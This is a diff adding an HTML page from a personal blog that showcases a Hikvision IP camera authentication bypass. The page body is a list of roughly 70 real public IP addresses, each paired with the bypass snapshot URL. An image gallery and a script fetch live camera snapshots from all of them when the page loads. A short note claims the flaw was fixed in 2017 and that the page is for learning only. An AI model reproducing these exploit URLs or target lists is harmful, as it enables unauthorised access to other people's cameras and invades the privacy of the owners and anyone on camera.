@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;" name="viewport" />
+    <title>HikvisionIP摄像头后台绕过-展示 | RavelloH's Blog</title>
+    <meta name="keywords" content="RavelloH,blog,python,spider,html">
+    <meta name="description" content="应用HikvisionIP摄像头后台绕过漏洞快速查询目标">
+    <!-- CSS -->
+    <link type="text/css" rel="stylesheet" href="css/common.css">
+    <link type="text/css" rel="stylesheet" href="/css/style.css">
+    <link type="text/css" rel="stylesheet" href="/css/iconfont.css">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+
+<body>
+    <section class="showcase">
+        <div class="shade"></div>
+        <header>
+            <h2 class="logo">
+                <a href="/" class="logos">
+                    <img class="logoimg" src="/img/avatar.jpg" style="width: 1.5em;border-radius: 50%;" alt="avatar">
+                    <img class="logoname" src="/img/RavelloH.svg" alt="RavelloH's Blog">
+                </a>
+            </h2>
+            <div class="headers">
+                <nav>
+                    <a href="/">
+                        HOME
+                    </a>
+                    <a href="/works/">
+                        WORKS
+                    </a>
+                    <a href="/articles/">
+                        ARTICLES
+                    </a>
+                    <a href="/tag/">
+                        TAG
+                    </a>
+                    <a href="/about/">
+                        ABOUT
+                    </a>
+                </p>
+            </nav>
+        </div>
+        <div class="toggle" class="header">
+        </div>
+    </header>
+
+    <div class="overlay"></div>
+    <div class="article" id="text">
+        <div class="center info">
+            <em>
+                <b>注:此漏洞已于2017年被修复。本文仅作为学习用途。</b>
+                <br /><br />
+            </em>
+            <em>
+                <span id="loadingtext"></span>
+            </em>
+        </div>
+        <br>
+        <br>
+        <p>
+            <div class="imgarea">
+                <div class="imglist">
+                    <img class="brick" src="http://221.0.16.166:8808/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://114.246.216.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://116.132.38.26:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://61.155.60.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://111.17.186.222:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://60.211.176.138:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://139.170.232.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://60.29.192.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://218.17.121.235:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://222.135.125.233:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://120.211.63.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://120.236.75.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://115.238.136.42:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://39.89.12.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://27.9.47.186:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://220.132.146.242:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://110.167.76.104:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://112.16.175.58:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://222.184.120.162:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://119.120.224.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://180.161.47.184:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://180.161.91.12:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://211.140.148.199:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://211.143.231.238:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://223.68.200.14:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://114.218.22.55:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://59.173.49.211:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://119.1.107.250:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://27.200.21.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://27.196.174.10:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://103.100.64.75:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://180.158.150.171:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://218.203.76.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://117.86.108.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://116.232.75.214:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://116.230.31.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://125.123.232.251:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.214.115.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://101.74.233.94:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://180.165.218.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://114.88.37.77:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://114.95.248.231:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://220.178.172.134:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://220.180.211.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://124.77.94.21:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://114.233.4.106:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://114.231.243.80:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://125.90.3.102:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://125.95.237.71:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://14.120.74.123:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://223.82.14.139:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://223.82.36.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://116.11.185.163:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.250.109.133:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.250.246.173:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.247.200.105:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.248.215.239:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.196.178.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://115.171.0.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.233.250.61:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.238.201.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://111.194.239.146:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://61.131.71.114:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://218.94.67.130:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://218.88.5.67:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://183.63.221.22:88/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                    <img class="brick" src="http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK">
+                </div>
+            </div>
+
+            <hr>
+            <br>
+            <span class="iconfontmini icon-aboutcircle"></span> 原创内容使用 知识共享 署名-非商业性使用-相同方式共享 4.0 (CC BY-NC-ND
+            4.0)
+            协议授权。
+
+            <br><br>
+            <div id="tcomment"></div>
+            <script src="https://cdn.staticfile.org/twikoo/1.6.4/twikoo.all.min.js"></script>
+            <script>
+                twikoo.init({
+                    envId: 'https://comment.z-blog.tk/',
+                    el: '#tcomment',
+                })
+            </script>
+
+        </div>
+        <ul class="social">
+            <li><a href="/about/"><span class="iconfont icon-about"></span></a></li>
+            <li><a href="http://github.com/ravelloh" target="_blank" rel="noreferrer"><span
+                class="iconfont icon-github"></span></a></li>
+            <li>
+                <a href="http://xeocnet-studio.github.io" target="_blank" rel="noreferrer">
+                    <span class="iconfont icon-home">
+                    </span>
+                </a>
+            </li>
+            <li><a href="/RSS/rss.xml" target="_blank"><span class="iconfont2 icon-rss"></span></a></li>
+        </ul>
+    </section>
+    <div class="menu">
+        <ul>
+            <script type="text/javascript" src="/js/menu.js"></script>
+        </ul>
+    </div>
+    <script>
+        var img = [];
+        var flag = 0;
+        var mulitImg = ["http://221.0.16.166:8808/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://114.246.216.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://116.132.38.26:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://61.155.60.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://111.17.186.222:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://60.211.176.138:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://139.170.232.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://60.29.192.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://218.17.121.235:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://222.135.125.233:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://120.211.63.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://120.236.75.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://115.238.136.42:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://39.89.12.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://27.9.47.186:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://220.132.146.242:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://110.167.76.104:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://112.16.175.58:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://222.184.120.162:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://119.120.224.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://180.161.47.184:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://180.161.91.12:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://211.140.148.199:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://211.143.231.238:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://223.68.200.14:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://114.218.22.55:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://59.173.49.211:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://119.1.107.250:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://27.200.21.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://27.196.174.10:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://103.100.64.75:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://180.158.150.171:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://218.203.76.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://117.86.108.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://116.232.75.214:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://116.230.31.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://125.123.232.251:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.214.115.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://101.74.233.94:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://180.165.218.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://114.88.37.77:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://114.95.248.231:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://220.178.172.134:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://220.180.211.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://124.77.94.21:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://114.233.4.106:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://114.231.243.80:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://125.90.3.102:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://125.95.237.71:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://14.120.74.123:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://223.82.14.139:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://223.82.36.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://116.11.185.163:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.250.109.133:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.250.246.173:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.247.200.105:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.248.215.239:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.196.178.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://115.171.0.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.233.250.61:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.238.201.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://111.194.239.146:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://61.131.71.114:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://218.94.67.130:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://218.88.5.67:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://183.63.221.22:88/onvif-http/snapshot?auth=YWRtaW46MTEK", "http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK"];
+        var imgTotal = mulitImg.length; //图片总数
+        for (var i = 0; i < imgTotal; i++) {
+            document.getElementById("loadingtext").innerHTML = "*文章插图加载中:" + flag + "/" + imgTotal;
+            img[i] = new Image()
+            img[i].src = mulitImg[i]
+            img[i].onload = function () {
+                flag++;
+                if (flag == imgTotal) {
+                    document.getElementById("loadingtext").innerHTML = "*文章插图加载完成:" + flag + "/" + imgTotal;
+                } else {
+                    document.getElementById("loadingtext").innerHTML = "*文章插图加载中:" + flag + "/" + imgTotal;
+                    return;
+                }
+            }
+        }
+    </script>
+
+    <!-- JavaScript -->
+    <script src="/js/script.js"></script>
+    <script type="text/javascript" src="/js/common.js"></script>
+    <script src="//instant.page/5.1.1" type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+
+
+</body>
+
+</html>
